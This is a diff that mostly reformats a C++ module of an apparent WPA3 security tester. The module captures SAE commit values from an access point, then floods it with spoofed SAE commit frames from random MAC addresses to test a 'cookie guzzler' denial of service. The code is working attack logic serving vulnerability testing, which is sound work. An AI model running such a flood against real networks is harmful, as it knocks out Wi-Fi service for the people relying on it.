@@ -4,45 +4,41 @@
 #include <string>
 #include <tins/tins.h>
 
-#include "attacks/DoS_hard/dos_helpers.h"
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
+#include "attacks/DoS_hard/dos_helpers.h"
 #include "config/RunStatus.h"
 #include "ex_program/external_actors/ExternalConn.h"
 #include "logger/log.h"
 #include "observer/resource_checker.h"
 #include "observer/tshark_wrapper.h"
-#include "system/hw_capabilities.h"
 #include "system/firmware/ath9k_htc.h"
+#include "system/hw_capabilities.h"
 
 using namespace std;
 using namespace Tins;
 using namespace chrono;
 
-namespace wpa3_tester::cookie_guzzler{
+namespace wpa3_tester::cookie_guzzler {
 
 void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int attack_time,
-				const sae_helper::SAEPair &sae_params, const string &att_mac, const size_t burst_size,
-				const size_t packets_per_second_limit
-){
+		const sae_helper::SAEPair &sae_params, const string &att_mac, const size_t burst_size,
+		const size_t packets_per_second_limit) {
 	PacketSender sender(iface_name);
-	dos_helpers::timed_burst(sender, attack_time, burst_size, packets_per_second_limit,
-	[&]() -> optional<RadioTap>{
+	dos_helpers::timed_burst(sender, attack_time, burst_size, packets_per_second_limit, [&]() -> optional<RadioTap> {
 		// get cookie_guzzler frame
-		return sae_helper::make_sae_commit(ap_mac, firmware::get_random_ath_masker_mac(att_mac) , sae_params);
+		return sae_helper::make_sae_commit(ap_mac, firmware::get_random_ath_masker_mac(att_mac), sae_params);
 	});
 }
 
-void run_attack(RunStatus &rs){
+void run_attack(RunStatus &rs) {
 	const ActorPtr ap = rs.get_actor("ap");
 	const ActorPtr attacker = rs.get_actor("attacker");
 
 	const auto &att_cfg = rs.config().at("attack_config");
-	const optional<sae_helper::SAEPair> sae_params = get_commit_values(rs, attacker.get(SK::iface),
-																		attacker.get_mon_iface(),
-																		ap.get(SK::ssid),
-																		ap.get(SK::mac), 30);
+	const optional<sae_helper::SAEPair> sae_params = get_commit_values(
+			rs, attacker.get(SK::iface), attacker.get_mon_iface(), ap.get(SK::ssid), ap.get(SK::mac), 30);
 
-	if(sae_params.has_value()){
+	if(sae_params.has_value()) {
 		rs.start_observers();
 		log(LogLevel::INFO, "SAE Commit captured");
 		const int duration = att_cfg.at("attack_time_sec").get<int>();
@@ -50,12 +46,14 @@ void run_attack(RunStatus &rs){
 		attacker->set_monitor_mode();
 		attacker->set_iface_up();
 		rs.process_manager.write_log_all(ATTACK_START_tag);
-		check_vuln(
-			attacker.get(SK::iface), ap.get(SK::mac),
-			duration, sae_params.value(), attacker.get(SK::mac),
-			att_cfg.at("burst_size").get<size_t>(),
-			att_cfg.at("packets_per_second_limit").get<size_t>());
-	} else{
+		check_vuln(attacker.get(SK::iface),
+				ap.get(SK::mac),
+				duration,
+				sae_params.value(),
+				attacker.get(SK::mac),
+				att_cfg.at("burst_size").get<size_t>(),
+				att_cfg.at("packets_per_second_limit").get<size_t>());
+	} else {
 		throw run_err("SAE Commit capture failed");
 	}
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
@@ -64,14 +62,15 @@ void run_attack(RunStatus &rs){
 	ap->conn->disconnect();
 }
 
-void stats_attack(const RunStatus &rs){
+void stats_attack(const RunStatus &rs) {
 	vector<unique_ptr<GraphElements>> elements;
-	rs.log_events(elements, {DISCONNECT, CONNECT, TESTER_TAGS});
+	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
 
-	const filesystem::path STA_graph_path = observer::tshark::tshark_graph(rs, "client", elements, "", "udp.srcport == 1234 && udp.dstport == 5201  ");
+	const filesystem::path STA_graph_path =
+			observer::tshark::tshark_graph(rs, "client", elements, "", "udp.srcport == 1234 && udp.dstport == 5201  ");
 	//const path AP_graph_path =
 	//    observer::tshark_graph(rs, "ap", events, observer::get_observer_folder(rs, "tcpdump"));
 
-	observer::resource_checker::create_graph(rs, rs.get_actor("ap").get(SK::source) , elements);
+	observer::resource_checker::create_graph(rs, rs.get_actor("ap").get(SK::source), elements);
 }
 }
